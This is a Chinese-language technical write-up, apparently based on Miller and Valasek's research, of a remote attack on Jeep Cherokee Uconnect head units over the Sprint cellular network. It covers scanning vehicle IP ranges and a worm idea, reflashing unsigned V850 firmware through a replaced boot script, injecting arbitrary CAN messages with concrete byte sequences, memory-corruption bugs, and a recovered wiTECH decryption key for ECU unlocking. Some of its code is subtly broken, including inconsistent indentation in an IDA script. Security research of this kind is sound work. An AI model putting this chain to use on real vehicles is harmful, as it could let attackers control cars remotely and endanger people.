地址 192.168.5.1 是 Uconnect 系统的WiFi网络地址；地址 68.28.89.85 是一个互联网地址，但端口 6667 并不是在这个地址上开放的；地址 21.28.103.144 是 Uconnect 连接互联网的真实地址，但是仅能被 Sprint 网络内部访问。经过试验，发现 PPP 接口的IP地址会在车辆每次重启时改变，但地址空间总在两个A类地址块内：21.0.0.0/8 或 25.0.0.0/8，这应当是 Sprint 网络分配给车辆的IP地址段。这里特别重要的是找到绑定内部网络端口 6667 的方法，下面的输出是执行 `netstat` 命令的结果：

```sh
$ netstat

Active Internet connections
Proto Recv-Q Send-Q Local Address Foreign Address State
tcp 0 0 144-103-28-21.po.65531 68.28.12.24.8443 SYN_SENT
tcp 0 27 144-103-28-21.po.65532 68.28.12.24.8443 LAST_ACK
tcp 0 0 *.6010 *.* LISTEN
tcp 0 0 *.2011 *.* LISTEN
tcp 0 0 *.6020 *.* LISTEN
tcp 0 0 *.2021 *.* LISTEN
tcp 0 0 localhost.3128 *.* LISTEN
tcp 0 0 *.51500 *.* LISTEN
tcp 0 0 *.65200 *.* LISTEN
tcp 0 0 localhost.4400 localhost.65533
ESTABLISHED
tcp 0 0 localhost.65533 localhost.4400
ESTABLISHED
tcp 0 0 *.4400 *.* LISTEN
tcp 0 0 *.irc *.* LISTEN
udp 0 0 *.* *.*
udp 0 0 *.* *.*
udp 0 0 *.* *.*
udp 0 0 *.* *.*
udp 0 0 *.bootp *.*
```

上面例子中，端口 6667 被标记为知名服务 IRC，且被绑定到所有网络接口。因此 D-Bus 通信可以经蜂窝网在 Jeep 上执行。Miller 等人尝试了使用一款 Sprint Airave 2.0型号的 femtocell（小基站）设备迫使 Jeep 连接到他们自建的蜂窝网络。这款设备有公开的渗透脚本，可以打开 Telnet 和 Https。通过使用这个渗透脚本，Airave 设备可以通过 Telnet 访问。令人兴奋的是，可以通过蜂窝网络 Ping 到 Jeep 车并访问 D-Bus 服务。这意味着可以使用相同的渗透脚本实现很大范围的攻击。

在尝试使用自己基站证明能够通过蜂窝通信实现攻击后，还需要验证公共的 Sprint 通信基站是否可以实现攻击。首先通过一台 Sprint 低端手机（Sprint burner phone）可以与其他 Sprint 设备、Jeep 车等等进行通信。这使攻击的范围大幅扩大。更令人吃惊的是，蜂窝通信连接不限于某单个基站或蜂窝片区，美国国内的任何 Sprint 设备都可以与其他 Sprint 设备进行ping 或 telnet 访问。例如，下面是从 Pttsburgh 访问 St. Louis Jeep 车的例子：
```
$ telnet 21.28.103.144 6667
Trying 21.28.103.144...
Connected to 21.28.103.144.
Escape character is '^]'.
a
ERROR "Unknown command"
```

注意：联网主机需要连接到 Sprint 网络上，例如通过 Sprint 移动电话或某个 Uconnect WiFi 热点，而不是互联网上的任意主机。

### 扫描有漏洞的车辆

为了发现更多存在漏洞的车辆，可以通过扫描IP地址 21.0.0.0/8 和 25.0.0.0/8 区间的 Sprint 设备是否开放了 6667端口，凡是有响应的都可认为是存在漏洞的 Uconnect 系统或 IRC 服务器。下面列出了 Miller 等人发现有响应（极有可能存在漏洞）的车型：

2013 DODGE VIPER
2013 RAM 1500
2013 RAM 2500
2013 RAM 3500
2013 RAM CHASSIS 5500
2014 DODGE DURANGO
2014 DODGE VIPER
2014 JEEP CHEROKEE
2014 JEEP GRAND CHEROKEE
2014 RAM 1500
2014 RAM 2500
2014 RAM 3500
2014 RAM CHASSIS 5500
2015 CHRYSLER 200
2015 JEEP CHEROKEE
2015 JEEP GRAND CHEROKEE

由于一台车可以扫描其他有漏洞的车辆，并且渗透过程不要去用户交互，所以这个代码可以写成一个蠕虫。它将不断扫描漏洞车辆，渗透他们后再进行扫描...。

### V850

在实现远程命令执行后，还不能进行远程控车。这需要借助CAN总线发送控车消息。之前提到 Uconnect OMAP 芯片是借助 Renesas V850ES/FJE芯片连接和使用两种CAN总线的，所以下一步就是探索如何利用 V850 了。

分析车机系统中的文件，发现 V850 和 CAN 通信被引用为 “IOC” ，而且可以在程序中发现 IOC 是可以被车机主控 OMAP 芯片升级的，升级包需要放在 USB 介质中。研究 IOC 如何被升级、如何使用篡改后的固件刷写 IOC 就成为下一步横向扩展的关键。 

这里的 IOC 可能处于三种状态：一是 application mode，作为常态模式其 bootloader 和固件是完整的且可运行应用代码；二是 bootloader mode，这个模式用于更新 IOC 上的应用固件；三是 bootloader updater mode，用于加载固件到 RAM 并可被更新。

再次分析升级ISO镜像中的“manifest.lua”，可以发现有一个用于升级IOC应用固件的单个文件，名为“cmcioc.bin"。这个二进制文件实际上是完整的 V850 固件。此外，在“manifest.lua”还可以看到其他几个有关升级 IOC 或其 bootloader 的文件，如下所示：

```lua
ioc = 
{
  name = "ioc installer.",
  installer = "ioc",
  data = "cmcioc.bin",
}

ioc_bootloader = 
{
  name = "IOC-BOOTLOADER",
  iocmode = "no_check",
  installer = "ioc_bootloader",
  dev_ipc_script = "usr/share/scripts/dev-ipc.sh",
  bootloaderUpdater = "usr/share/V850/cmciocblu.bin",
  bootloader = "usr/share/V850/cmciocbl.bin",
  manifest_file = "usr/share/V850/manifest.xml"
},

ioc = 
{
  name = "IOC",
  installer = "ioc",
  dev_ipc_script = "usr/share/scripts/dev-ipc.sh",
  data = "usr/share/V850/cmcioc.bin"
},
```

从数量上看，相关 IOC 升级的文件不多，比较重要的是应用固件代码，研究这些代码有助于实现 CAN 消息发送和接收。下面的例子用于枚举 "usr/share/V850/" 中的内容：

```sh
$ ls -l usr/share/V850/
total 1924
-r-xr-xr-x 1 charlesm staff 458752 Jan 30 2014 cmcioc.bin
-r-xr-xr-x 1 charlesm staff 65536 Jan 30 2014 cmciocbl.bin
-r-xr-xr-x 1 charlesm staff 458752 Jan 30 2014 cmciocblu.bin
-r-xr-xr-x 1 charlesm staff 604 Jan 30 2014 manifest.xml
```

逆向分析这些文件是为了找到一个确切地能修改 V850 固件的方法，实现希望的横向移动（从 D-Bus 服务利用到ECUs控制）。经过分析，IOC 应用代码是使用 “iocupdate” 命令从 Uconnect 系统推送到 V850 的，这一点可以在 “ioc.lua" 脚本中发现调用命令的语句：

`iocupdate -c 4 -p usr/share/V850/cmcioc.bin`

命令 “iocupdate” 给出的帮助信息也证实了之前的分析：

```
$ iocupdate
%C: a utility to send a binary file from the host processor to the IOC
[options] <binary file name>
Options:
-c <n> Channel number of IPC to send file over (default is /dev/ipc/ch4)
-p Show progress
-r Reset when done
-s Simulate update
Examples:
/bin/someFile.bin (will default to using /dev/ipc/ch4)
-c7 -r /bin/someFile.bin (will reset when done)
-sp (simulate update with progress notification)
```

既然 `iocupdate` 可以把升级文件传给 V850，那么如何对一个 IOC 应用固件加入接收命令和发送 CAN 消息的代码呢？这需要对 IOC 应用固件进行逆向。很幸运的是，IOC固件重刷没有加密签名验证固件合法性。逆向过程使用 IDA Pro 较为方便，因为已经集成了 V850芯片的支持包。

<img src="images/idapro-v850支持.png">

使用 IDA Pro 加载 “cmcioc.bin” ，第一条指令为 `ROM:00010000  jr loc_77952`, 熟悉逆向的朋友可能会觉得第一行就跳转很奇怪，但分析可知第一行指令是跳转到 setup 代码，初始化所需数据。为了能够准确全面的加载镜像，需要核对 IDA 默认的 ROM 起始地址是否与指令序列中引用的起始地址一致，否则不能完整加载镜像。逆向分析过程花费了 Miller 等人几周时间，特别是为了发现使用无线接口发送任意 CAN 消息的机制。具体过程如下：
- 首先通过查找代码、修复 IDA Pro没发现的分区、识别函数、确保所有函数的调用和交叉引用正确，确保IDB（IDA Pro 程序分析数据库）正确可用。如果执行正确，会看到IDB中 IDA Pro ROM Section 的 Regular Function 占据了大部分比例（大于4/5），而 Unexplored 函数、数据及其他占少部分。
- IDB 调整正常后，分析 V850/Fx3 处理器的 DataSheet，找出内存段（Segments）、寻址（addressing）、寄存器（registers）和其他可用于逆向分析的重要信息。
- 找出 V850 的地址空间和对应固件是第一要务，通常在获得和分析相关文档后会容易一些，代码、外设、RAM会被放在不同的段（segments）。

<img src="images/imageincpumemoryspace.png">

- 然后在IDB中生成一个与下图近似的分段，反映出 V850 处理器的地址空间布局，用于运行相应的固件。根据分析可知，ROM Segment 起始于 0x10000，截止到 0x70000，包含了为实现攻击的代码。V850 有32KB的RAM，映射地址为 0x3FF7000～0x3FFEFFF。RAM区保存着变量和许多交叉引用（对 IDB）。还有一个特殊功能寄存器段 SFR segment，它是内存映射寄存器，用于各种用途。
- 还有一点很重要，有12KB可编程外设 I/O 区 PPA，它包含了 CAN 模块、相关寄存器、对应消息缓冲区等。这个 PPA 区域的基址由外设区域选择控制寄存器 BPC 指定。通常，V850类似的微处理器，PPA的基址为 0x3FEC000。

下图显示了 IDB 中所有的分段：

<img src="images/V850芯片固件IDB分段布局.png">

之前提到 V850 使用 GP 相对寻址来访问RAM中的变量，可以使用相对于GP的负偏移寻址指令，GP 反过来会变为一个虚地址。例如：将 -0x2DAC 存放到 GP，GP 值会 0x3FFF10C - 0x2DAC，给出地址 0x3FFC360。

Miller 等人编写了一个脚本来迭代 IDB 中所有的函数并是用 GP 相对寻址来生成某些指令的交叉引用：

```python

def do_one_function(fun):
    for ea in FuncItems(fun):
        mnu = idc.GetMnem(ea)
        # handle mova, -XXX, gp, REG
        if idc.GetOpnd(ea,1) == 'gp' and idc.GetOpType(ea,0) == 5:
            opnd0 = idc.GetOpnd(ea,0)
            if "unk" in opnd0:
                continue
            if("(" not in opnd0):
                data_ref = gp + int(idc.GetOpnd(ea,0), 0)
                print "MOV: Add xref from %x -> %x" % (ea, data_ref)
                idc.add_dref(ea, data_ref, 3)
        # handle st.h REG, -XXX[gp]
        op2 = idc.GetOpnd(ea,1)
        if 'st' in mnu and idc.GetOpType(ea,0) == 1 and 'gp' in op2 and "(" not in idc.GetOpnd(ea,1):
            if "CB2CTL" in op2:
                continue

            end = op2.find('[')
            if end > 0:
                offset = int(op2[:end], 0)
                print "ST: Add xref from %x -> %x" % (ea, gp + offset)
                idc.add_dref(ea, gp + offset, 2)
      # handle ld.b -XXX[gp], REG
      op1 = idc.GetOpnd(ea,0)
      if 'ld' in mnu and 'gp' in op1 and idc.GetOpType(ea,1) == 1 and "(" not in idc.GetOpnd(ea,0):
          if "unk" in op1:
              continue

          end = op1.find('[')
          if end > 0:
              offset = int(op1[:end], 0)
              print "LD: Add xref from %x -> %x" % (ea, gp + offset)
              idc.add_dref(ea, gp + offset, 3)
```

这些指令和交叉引用提供了变量被何处引用以及跟踪回看等功能。这有助于我们理解数据或代码的用途。

经过前述步骤处理，代码比较规整且有了RAM中变量的交叉引用。下面考虑分析负责 CAN 交互的PPA段。可以假设任何处理CAN的代码，例如读取CAN总线消息、向CAN消息队列写消息都会引用PPA段内存地址。V850 可能在每个包里含有4个CAN模块，但是 Miller 等人发现在固件里仅有2个被使用。Renesas 官方对V850芯片文档介绍了CAN模块所使用的寄存器和消息缓冲区，这些寄存器和消息缓冲区都是基于PBA（ CAN0 register base address）这个基址的偏移。在 Miller 的报告中，PBA = 0x3FEC000（这个地址也是瑞萨官方文档中所列的值）。利用这些 Base 和 Offset 信息，就可以查看所有用于CAN交互的寄存器和消息缓冲区，还可以在IDB中对Base和Offset命名，方便进行交叉引用查看。下面的脚本是参考 Renesas V850ES/FX3 文档中的寄存器名称，为IDB相应偏移位置命名（以便后续分析 PPA 段）的 Python 脚本示例：

```py
# create_segs_and_regs.py
PBA = 0x3FEC000

def create_can(OFFSET,mark):
    can_interface = 0
    for i in range(0,4):
        ea = OFFSET + (can_interface * 0x600)
        msg_buffer = ea + 0x100
        curr_can = "C" + str(can_interface)

        # Global Control Register
        MakeWord(ea)
        MakeName(ea,curr_can+"GMCTRL"+mark)
        MakeVar(ea)
        ea += 0x2

        #Global clock selection register
        Makeword(ea)
        MakeName(ea,curr_can+"GMCS"+mark)
        MakeVar(ea)
        ea += 0x4

        #Global automatic block transmission register
        Makeword(ea)
        MakeName(ea,curr_can+"GMCABT"+mark)
        MakeVar(ea)
        ea += 0x2

        MakeArray(ea,0x38)
        MakeName(ea,curr_can+"GMABTD"+mark)
        MakeVar(ea)
        ea += 0x38

        MakeWord(ea)
        MakeName(ea,curr_can + "MASK1L"+mark)
        MakeVar(ea)
        ea += 0x2

        MakeWord(ea)
        MakeName(ea,curr_can + "MASK1H"+mark)
        MakeVar(ea)
        ea += 0x2
```

通过这段脚本，可以将V850手册中的命名批量应用于IDB中，方便我们查看和理解程序（逆向过程中最为耗时的部分）。例如，下面图示了CAN-0模块的第2和第3个 CAN 消息缓冲区：

<img src="images/can-0module的mesagebuffer1and2.png">

在 IDB 中有了RAM中变量的交叉引用之后，一个 PPA 段就可以根据设定的 CAN 控制寄存器和消息缓冲区名称进行识别和分析，并且 ROM 的代码段也完全规整好了。但是，到目前为止，仍然无法查看 ROM 中代码段对 PPA 段的引用（也就是无法找到CAN消息传递的有关函数或代码）。Miller 等人决定下载 IAR workbench ，这个工具常用于汽车相关的代码编译，也适用于 V850。IAR 中有一些针对V850处理器的示例代码，其中也包括一些收发 CAN 消息的。

<img src="images/IAR-example-v850-can-code.png">

上面图片中可以看到 CTL 寄存器被设置为 0x200，表明一个事件将要发生并且在删除 Uconnect 固件后，发现一个执行相同操作的位置。之后完全逆向该函数（称其为 “can_transmit_msg”），原以为这个函数会使分析更加清晰，但是这个函数并不直接访问 PPA，而是访问了ROM中的变量，指向了相关的CAN Segment。这意味着有一个 CAN 模块的数组，访问相关函数前需要指明其索引 index。参考 IAR workbench 中的例子，我们现在有了完成 CAN 总线交互的函数的相关引用（地址）了。

<img src="images/IAR-example-v850-can-code.png">

与CAM 通信相关的变量存放在ROM中，而用于CAN的消息缓冲区和控制寄存器存放在RAM中。基本上，由于较短事件周期后，数据需要被重写，所以PPA中的数据与RAM之间反复拷贝。例如，下图示例了逆向分析这段函数（称之为 “can_write_to_ram”），它从 PPA 中拷贝数据到 RAM，并从 RAM 中读取数据到 PPA。

<img src="images/readcanfromppa.png">

在RAM中，还有几个别的重要的区域用于存放 CAN IDs、CAN 数据长度和 CAN 消息数据，有一个指向存储在RAM中的变量的指针数组，它是发送CAN消息的组成部分。

<img src="images/RAM指针.png">

跟踪 CAN 寄存器、消息缓冲区、RAM 值的过程，使 Miller 等人完全逆向分析了多个用于收发 CAN 消息的函数。最有价值的是一个命名为 “can_transmit_msg_1_or_3” 的函数，它使用一个索引值在 CAN IDs数组中取出所需的 ID，以及指向数据长度和 CAN 消息数据的指针。通过将数据填充到RAM中特定位置，我们以利用这段固件代码发送任意的 CAN 消息、控制 CAN消息的ID、长度和数据。

<img src="images/can-transmit-msg1or3.png">

现在最大的的问题是，尽管有一定能力篡改任意 CAN 消息，但是没有好的调用该函数的方法。所以接下来 Miller 等人只得修改固件代码，并且尝试从 Uconnect 主控芯片 OMAP 发送 CAN 消息，而 V850 只是 OMAP 与 ECUs 之间的代理。Uconnect 系统上虽然有一些执行 CAN 功能，但没有直接克调用向底层ECUs直接发送消息的函数，所以只能另寻他路。

V850/Fx3 也支持经过SPI和I2C的串口通信，但是仅保留了与车机主控的 SPI 通信连接。因此，Miller 等人尝试在固件中查看是否有可能做 SPI 数据处理。 SPI 是一种非常简单的串口协议，所以只需在线缆和代码上找那些看起来是逐字节处理的特定值。例如，下图中 ROM：0004A1E6 处的内容：

<img src="images/spi-channel7.png">

上图显示了在 SPI channel 7 线路的代码，可以看到上面图中ROM：0004A1E6 处的 0x22，用于后续匹配比较。后面我们会利用这些发现来改变 IOC 固件，使之发送数据给 V850 芯片，传递变量和发送任意 CAN 消息。

逆向 V850 固件和 SPI 通信花费了数周时间，这是本项目中最复杂的部分。

IOC 功能运行在 V850 芯片上，它可以直接访问 CAN 总线，因此改变 IOC 并发现一条从Uconnect 通向它的实现指令调用的通路是最重要的工作目标。由于 V850 的固件没有签名验证且可以经车机进行升级（修改），但目前只能经过USB盘进行升级，对于远程攻击者这一条件是不具备的。需要寻找无需USB设备就能从 OMAP 芯片刷写V850的方法。

前文已经描述过IOC更新过程由 “iocupdate” 可执行文件执行，经过 SPI channel 4 来执行类似 ISO-14230 标准的命令。当V850处于应用模式时，“iocupdate”二进制文件不会对其起作用，这是主机处于“开启”状态时的状态。当V850处于正常模式时，发送给它的所有这些SPI消息都会立即被忽略。必须令IOC处于 bootrom mode 下才能实现固件更新。然而，唯一能令 V850 处于“bootrom mode” 的方法是重启它，然后同时重启 OMAP 处理器（这会使攻击者也失去控制）。当 OMAP 处理器以 “update mode” 启动且 IOC 处于 “bootrom mode”时，它会尝试从一个USB盘进行升级。这个方式被硬编码在升级方式中，不能被改变。

第一步是获取重启 V850 到 bootloader 模式且OMAP处于 update mode 的代码。这是一段 Lua 代码：

```lua
onoff = require "onoff"
onoff.setUpdateMode(true)
onoff.setExpectedIOCBootMode("bolo")
onoff.reset( "bolo")
```

下面对应的代码是将 V850 置回 application mode 且 OMAP 处于 normal 模式：
```lua
onoff = require "onoff"
onoff.setExpectedIOCBootMode( "app")
onoff.setUpdateMode(false)
onoff.reset( "app")
```

下一步要做的是当 V850 为 bootrom mode 且 OMAP 处于 udpate mode 时，尝试获得代码执行权，以便我们可以绕过任何要求 USB 盘连接的检查。回想一下，当OMAP处理器重新启动则无法与它通信（远程接口将无法启用）。通过仔细分析车机如何在 update mode 下启动，Miller 等人发现可以在 update mode 下运行代码。文件 “bootmode.sh” 是执行过程中第一个文件。

不幸的是，不能修改文件 “bootmode.sh”，因为它存放在非可写目录下，但是下面是该文件的一部分：

```sh
#!/bin/sh

 #
 # Determine the boot mode from the third byte
 # of the "swdl" section of the FRAM. A "U"
 # indicates that we are in Update mode. Anything
 # else indicates otherwise.
 #
inject -e -i /dev/mmap/swdl -f /tmp/bootmode -o 2 -s 1
BOOTMODE=`cat /tmp/bootmode`
echo "Bootmode flag is $BOOTMODE"
rm -f /tmp/bootmode
if [ "$BOOTMODE" != "U" ]; then
  exit 0
fi
echo "Software Update Mode Detected"
waitfor /fs/mmc0/app/bin/hd 2
if [ -x /fs/mmc0/app/bin/hd ]; then
  echo "swdl contents"
  hd -v -n8 /fs/fram/swdl
  echo "system contents"
  hd -v -n16 /fs/fram/system
else
  echo "hd util not detected on MMC0"
fi
```

如上面代码所示，如果 OMAP 芯片不在 update mode 下，该文件中剩下的代码就不在执行了。如果 OMAP 芯片 处于 update mode 下，那么文件剩余代码继续执行且执行 “hd” 程序，此程序位置在 “/fs/mmc0/app/bin/” 是可写的，我们可以修改hd来达成目的。这样一来，为了实现 OMAP in update mode 且 V850 in bootloader mode 下执行代码的目的，需要替换 “/fs/mmc0/app/bin/hd” 文件，此时包含在 “hd” 中的任何代码都会被执行，由此实现 V850 固件的更新。

下面是修改后的 “hd” 文件：
```sh
#!/bin/sh
# update ioc
/fs/mmc0/charlie/iocupdate -c 4 -p /fs/mmc0/charlie/cmcioc.bin
# restart in app mode
lua /fs/mmc0/charlie/reset_appmode.lua
# sleep while we wait for the reset to happen
/bin/sleep 60
```

其他相关部分都粗放在 /fs/mmc0 这个可写分区，之后重启系统进入 bootloader 模式，这一步由脚本 “omap.sh” 实现。

总的来说，更新过程需要25秒，包括必要的启动进入 application mode 的时间。在重启后进入 application mode 后，新的 V850 固件将开始运行。


OMAP 芯片与 V850 芯片通过 SPI 使用专有协议进行通信。这一通信包括像刷写 V850 芯片、执行 DTC 操作和发送 CAN 消息等方面，在实现上以各种服务形式发生。具体而言，可以通过读写 /dev/spi3 实现直接通信。但是，不幸的是没有看到 OMAP 芯片直接给 V850 发送带有任意 CAN ID 数据的命令。在 V850 有一些命令中含有硬编码的 CAN IDs，这些数据被发送给 OMAP 芯片。要想实现攻击，还需要更多的命令。

SPI 消息协议

Miller 等人没有完全逆向OMAP芯片到 SPI 芯片的完整 SPI 消息协议，但是有一些特别重要的在分析之列。当 V850 处于 update mode 时，通信看起来像 ISO 14230 协议，这一点可以从 “iocupdate” 二进制文件的逆向中可以得到。下面是一些例子：

```
startDiagnosticSession: 10 85
ecuReset: 11 01
requestTransferExit: 37
requestDownload: 34 00 00 00 00 07 00 00
readEcuIdentification: 1A 87
```

当 V850 处在 normal mode 时，有关通信看起来比较复杂。有些通信字节体现了消息的长度。实际消息的第一字节反映了 “channel” 信息，其他字节是数据部分。总的来看，每个 channel 都是通过 “/dev/ipc/ch7” 进行访问的。虽然没有弄清所有使用的信道，但是有一些比较明确：
- Channel 6: ctrlChan，用于发送预编程的CAN消息
- Channel 7: 用于处理 DTC 和诊断
- Channel 9: 用于从 V850 获取时间
- Channel 25: 用于某种密钥


如果查看 “platform_version.lua" 文件，可以看到如何查询运行在 V850 上的固件的应用版本。如果经过 channel 7 发送两个特殊字节，V850 将返回版本信息。

```
ipc_ch7:write(0xf0, 3)
…
local function onIpcMessage(msg)
 if msg[1] ~= 240 then
 return
 end
…
 if msg[2] == 3 then
 versions.ioc_app_version = msg[3] .. "." .. msg[4] .. "." .. msg[5]
 ipc_ch7:close()
 end
 end
```

因此，如果我们发送 “F0 03”，会得到5个字节的返回，其中包含版本信息 x.y.z。可以从OMAP芯片上恰当的 D-Bus 服务来实现这类检查。

```
service = require "service"
x=service.invoke("com.harman.service.platform" ,"get_all_versions", {})
print(x, 1)

# 以下为响应结果：
 app_version: 14.05.3
 ioc_app_version: 14.2.0
 hmi_version: unknown
 eq_version: 14.05.3
 ioc_boot_version: 13.1.0
 nav_version: 13.43.7
```


这里有一个简单的程序，用于获得 V850 芯片的编译日期：

```lua
file = '/dev/ipc/ch7'
g = assert(ipc.open(file))
f = assert(io.open(file, "r+b"))

g:write(0xf0, 0x02)
bytes = f:read(0x18)
print(hex_dump(bytes))

g:close()
f:close()
```

下面是输出，可以看出编译时间为 2014-01-09 20:46:

```sh
$ lua spi.lua
0000: 00 f0 02 42 3a 46 2f 4a ...B:F/J
0008: 61 6e 20 30 39 20 32 30 an 09 20
0010: 31 34 2f 32 30 3a 34 36 14/20:46
```

之前已经提到可以刷写 V850 固件。但是，如果他们使用加密签名，或者您只想动态影响v850，而不重新编程，不留下任何篡改证据，该怎么办？Miller 等人查看了 V850 固件中解析 SPI 消息的代码，发现一些隐藏的漏洞。因为 Miller 等人暂不需要利用且没有 V850 debugger，所以没有真实验证这些存在内存崩溃的漏洞。

SPI 接口暴露的攻击面是非常小的，受 SPI 通信的自身特点限制，相关代码不够健壮。在 V850 固件的 SPI 处理代码中，发现有两个内存崩溃漏洞：

```s
0004A212 ld.w -0x7BD8[gp], r16 -- 3ff7534
0004A216 ld.w 6[r16], r17
0004A21A mov r17, r6
0004A21C addi 5, r28, r7
0004A220 ld.bu 4[r28], r18
0004A224 mov r18, r8
0004A226 jarl memcpy, lp 
```

上述代码中，r28 指向了通过SPI发送给用户控制的数据。这段代码还可以进一步反编译为：

```c
memcpy(fixed_buffer, attacker_controlled_data, attacker_controlled_len);
```

这里有可能是一个栈溢出：

```s
0004A478 movea arg_50, sp, r6
0004A47C addi 5, r28, r7
0004A480 ld.bu 4[r28], r10
0004A484 mov r10, r8
0004A486 jarl memcpy, lp
```

如果如上文所示成功更新了V850固件，你可以从 OMAP 发送任意的 CAN 数据。有许多种方法实现这一点，但是最简单、最安全的方式是在 SPI 消息里发送 CAN 数据，这样可以传递给 V850 固件中合适的函数，使其通过 V850 向 ECUs 发送。Miller 等人选择了在 SPI channel 7上发送消息 “F0 02”，如上文所示得到了固件编译时间。选择这个命令是因为没有发现实际调用它的代码，所以即便发送命令存在问题也不至于引起致命错误。相关函数处理 channel 7 的部分在地址 0x4b2c6 处。处理 “F0 02” 的代码从 0x4aea4 处开始。Miller 等人使用的方法是改变这段代码，然后跳到ROM中未使用的、可以放置任何代码的地方。在这段代码末尾，返回执行原来的代码。如下图所示：

<img src="images/newcode-addedtothefirm.png">

Miller 等人使用了名为“can_transmit_msg_1_or_3” (位置为 0x6729c)的函数，这个函数将92个固定值中的一个作为参数，这些固定值分别对应着一个CAN消息（ID、length、data）。这些 CAN 消息大部分的 ID 是固定的，他们是从 ROM 中读区。然而，对应个别值（例如 39 和 91），它从RAM中读取 CAN ID 和 LEN 。Miller 等人的代码从 SPI 消息中读取 CAN ID 并把他们放进恰当的RAM位置（ gp - 0x2CC4 ），然后从 SPI 数据包中拷贝数据到相应的 RAM 位置，最后拷贝数据长度将其放到存放长度信息的 RAM位置。调用这个函数发送这样构造出的消息，然后给 r18（被我们的远程跳板代码覆盖了）设置一个值并返回。之后，在车机端，类似下面的代码将发送一条 CAN 消息，高速CAN和中速CAN总线都可以，取决于使用 39 或是 91 消息。

```
ipc = require("ipc")
file = '/dev/ipc/ch7'
g = assert(ipc.open(file))
-- f0,02,39|91,LEN,CAN1,CAN2,CAN3,CAN4,DATA0,DATA1...
g:write(0xf0, 0x02, 91, 0x08, 0xf1, 0x86, 0xda, 0xf8, 0x05, 0x2F, 0x51, 0x06,0x03, 0x10, 0x00, 0x00)
```

下面小结一下完整的渗透链：
- 第一步：识别目标

首先需要某个目标车辆的IP地址。可以随机选择一个或编写一个蠕虫病毒攻击他们。如果知道目标车辆 VIN 或 GPS，可以扫描所在区域的IP段，直到找到对应的目标车辆。由于这些车联网设备是 Sprint 网络中的慢速设备，所以比较实际的方法是使用多个设备（上百个）并行扫描。

- 第二步：渗透车机的 OMAP 芯片

一旦掌握了某台含有前文所述漏洞的车辆的IP，可以使用恰当的 D-Bus 服务来运行指定代码。最简单的是上传一个 SSH 公钥、配置文件，然后启动 SSH 服务。这样就可以使用SSH远程终端连接车机了。

- 第三步：控制 Uconnect 系统

如果想控制 radio、HVAC、GPS 或其他非 CAN 相关攻击，那么仅需要使用 Lua 脚本就可以实现。事实上，许多功能可以通过 D-Bus 服务实现而不需要执行代码。

- 第四步：刷写 V850 固件

为了进一步控制车辆，特别是控制 CAN 相关功能，需要对 V850 芯片刷写篡改的固件。刷写过程需要准备好固件（bin文件）并且重启动系统，这可能会影响驾驶员当前操作（危险）。如果刷写失败，那么车机可能变砖。

- 第五步：执行功能

从车机 OMAP 芯片使用SPI通信向V850芯片发送命令，利用V850篡改后的固件发送适当的 CAN 消息给可以产生物理行为的车辆 ECUs，可以实现远程控车的目的。


## 信息物理交互

当可以从远程向车内发送 CAN 消息时，下一步需要明确在Jeep中 CAN 消息协议和数据载荷的组织方式。这需要结合试错、逆向机械工具、逆向ECU固件等多方面工作才能实现。

### 机械工具

为了与Jeep中的ECUs通过CAN进行底层交互，需要使用具备安全访问密钥和诊断测试功能的工具。但是 Jeep 上的装备不是标准的 J2534 pass-thru 设备和软件，而是一个专用的 wiTECH 设备，售价约 $6700。

当然，有些研究可以在无调试设备下进行，但是许多主动测试和ECU解锁需要特定机械工具的分析。Miller 等人最后筹资购买了 wiTECH 设备。下面图式为Jeep Cherokee ECU在 wiTECH 连接后的工作界面：

<img src="images/jeepcherokeeecudiagramfromthewitechsoftware.png">

虽然这个工具与其他不太一样，它使用了 Java而不是C/C++，但是容易被逆向，因为反编译字节码后有较为友好的名称。

<img src="images/witechnotablefiles.png">

制造商增加反编译困难的办法之一是使用字符串混淆，例如使用 Allatori obfuscator 这类JAVA混淆器。这种工具会在Java代码中搜索输出的字符串，然后对其进行“加密”处理并替代原字符串。

对 Java 字节码初步分析可以发现一个最简单的方法是将所需要的 wiTECH JARs 导入到一个 Java 应用中，然后使用库中的函数进行解密。

<img src="images/反混淆后的结果.png">

虽然wiTECH设备可以用于主动测试，例如用于打开挡风玻璃雨刷器的CAN消息，但对安全研究者来说，最大的吸引力在于分析软件以找出SecurityAccess算法，该算法用于为重新编程或其他特权操作“解锁”ECU。

这wiTECH不像以往检测过程中用到的诊断软件，没有包含任何实现生成密钥来解锁某个ECU的真实代码。最终，查看目录 “jcanflash/Chrysler/dcx/securityunlock/” 中的文件后，找到了专门用于解锁的功能，名称取决于待刷写的ECU类型。

继续进行静态分析，最终发现在 “/ngst/com/dcx/NGST/vehicle/services/security/SecurityUnlockManagerImp.java”中，包含下列所示代码：

```java
localObject = new ScriptedSecurityAlgorithm(new
EncryptedSecurityUnlock(((ScriptedSecurityMetaData)paramSecurityLevelMetaData).getScript()));
```

不幸地是，检查 EncryptedSecurityUnlock 不能给出更多地关于如何从seed产生密钥的算法细节。返回之前跟踪用于安全解锁的方法，其中指向了一个位于 “\jcanflash\com\dcx\NGST\jCanFlash\flashfile\odx\data\scripts\unlock” 的目录，这里面包含了许多后缀为 “.esu” （代表加密的安全解锁之意）文件。当使用 hex 编辑器查看这些文件时，里面没有可读性的字符串或内容。

<img src="images/wiTECHencryptedsecurityunlockfile.png">

尽管没有找到解锁算法，但是 Miller 等人对wiTECH的整个处理过程有了整体认识。这一wiTECH 应用将从某个ECU请求seed，seed取决于ECU类型；之后接收此seed；然后解密解锁文件，这些文件可能包含着产生密钥的算法。

再次检查 “EncryptedSecurityUnlock” 构造器，发现有下列：
```java
UC localUC = new UC();
SecurityUnlockFactoryImp localSecurityUnlockFactoryImp =
 new SecurityUnlockFactoryImp();
 try
 {
   byte[] arrayOfByte = localUC.d(a);
   ...
```

可以看出传给函数 d 的字节流，很可能是上面提到的加密数据。对构造函数进行去混淆，发现了下列非常精通的 i33t speak（leet speak），因为解密的密钥是“G3n3r@ti0n”.

```java
Uc.init(“G3n3r@ti0n”, “MD5”, “”, “BC”, “AES”, new String[]
{“com.chrysler.lx.UnlockCryptographerTest”,
"com.dcx.securityunlock.encrypted.EncryptedSecurityUnlock", “”,
“com.dcx.NGST.jCanFlash.flashfile.efd2.SecurityUnlockBuilderImpTest”});
```

之后在 “00A6.esu” 运行解密过程，可以看到下面真实的Javascript脚本，用于key的生成：

<img src="images/decryptedjsunlockfile.png">

在解密这个文件用于 ECU 解锁之后，可以查看这个js并改写为python。这里面引入了一些私密和逐位的操作，这些技巧在汽车工业中很常见。下面的图片显示了 Miller 等人编写的python代码，可用于解锁各种Jeep Cherokee中的 ECUs，而且相同算法可以用到多种车型。完整的代码可以查看 “JeepUnlock.py” 文件。
